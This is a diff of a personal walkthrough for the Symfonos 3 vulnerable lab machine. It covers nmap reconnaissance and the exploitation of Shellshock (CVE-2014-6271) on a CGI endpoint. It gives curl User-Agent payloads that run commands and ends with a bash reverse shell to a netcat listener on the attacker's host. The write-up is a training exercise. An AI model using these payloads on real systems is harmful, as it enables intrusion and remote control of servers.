@@ -1,4 +1,5 @@
-# Symfonos 3 Walkthrough
+# Symfonos 3 Walkthrough 
+## (Personal write-up, not copy with explanation)
 
 This write-up demonstrates how to approach and exploit the **Symfonos 3** vulnerable machine using Kali Linux tools.  
 The process follows a standard penetration testing methodology: reconnaissance, enumeration, exploitation, and privilege escalation.  
@@ -18,10 +19,11 @@ nmap -sS -A -O -p- <target-ip>
 ```
 With this, we can stealth scan SYN, collect information such as service + version, scan all port.
 Options:
-  -  sS: half-open scan with SYN (SERVER) -> SYN-ACK (CLIENT) -> RST (SERVER)
-  -   A: include 3 options such as -sV, -O, --script=default, --traceroute
-  -  sV: output information of service, version
-  -   O: OS dection
+  -  -sS: half-open scan with SYN (Client to server) -> SYN-ACK (Server to client) -> RST (Client to Server) and close connection. So it doesn't have a real connection like a full hand-shake and OS won't log this connection.
+
+  -   -A: include 3 options such as -sV, -O, --script=default, --traceroute
+  -  -sV: output information of service, version
+  -   -O: OS dection
   - -p-: scan all port (65535 ports)
     
 <img width="1296" height="738" alt="image" src="https://github.com/user-attachments/assets/88e56c05-520b-41da-a28b-d0aa6d9b5a20" />
@@ -77,4 +79,75 @@ The scan revealed the endpoint:
 
 <img width="1281" height="241" alt="image" src="https://github.com/user-attachments/assets/a903e9ba-7239-460b-8773-7153e467a67b" />
 
+This script will be executed by **Bash** through the `/cgi-bin/` directory.  
+The response includes a dynamic timestamp, which indicates command execution.  
+By testing with `curl`, we can verify whether the target is vulnerable to **HTTP Shellshock (CVE-2014-6271)**.
 
+
+![alt text](image-1.png)
+
+It returned **VUL** (via curl: `echo VUL`). This confirms the server is vulnerable to **HTTP Shellshock**.  
+This CVE can be exploited using a crafted payload script. The `/cgi-bin/` directory invokes Bash, which executes the payload (`echo VUL`).
+
+[Full description CVE 2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
+
+Try another test using nmap:
+```bash
+nmap -p80,443 --script http-shellshock --script args uri=/cgi-bin/underworld 192.168.223.129
+```
+![alt text](image-2.png)
+
+Finally, result showed that the server have a vulnerable is `http-shellshock` through `port 80`
+
+### Note: HTTP-Shellshock Explanation.
+
+Example payload:
+```bash
+() { :;}; echo; echo VUL
+```
+
+What is it? This is a "nothing to do" function with bash.
+
+`()` declares a Bash function.
+
+`{ :; }` empty function body:
+
+`:` built-in command meaning "do nothing".
+
+`:;` executes : and ends the command.
+
+`};` ends the function definition.
+
+Due to Shellshock (CVE-2014-6271), bash does not stop at the function.
+Instead, it executes any commands that follow `};`.
+
+`echo;` prints an empty line.
+
+Purpose: avoid syntax issues on some Bash versions and separate exploit output from the program’s original output.
+
+`echo VUL` prints VUL as proof the payload was executed.
+
+### Let's continue with write-up
+
+Try another test case get id from bash
+
+``` bash
+curl -A "() { :;};echo ;/bin/bash -c 'id'" http://192.168.223.129/cgi-bin/underworld
+```
+
+![alt text](image-3.png)
+
+This command returned `id` from that server.
+Now we will exploit the CVE 2014-6271 through `netcat`
+
+```bash
+nc -nvlp 4444
+```
+
+Listening from port 4444
+
+Give command to contact with our port 4444 through CVE 2014-6271
+
+```bash
+curl -A "() { :;};echo ;/bin/bash -c 'bash -i >& /dev/tcp/192.168.223.128/4444 0>&1'" http://192.168.223.129/cgi-bin/underworld
+```
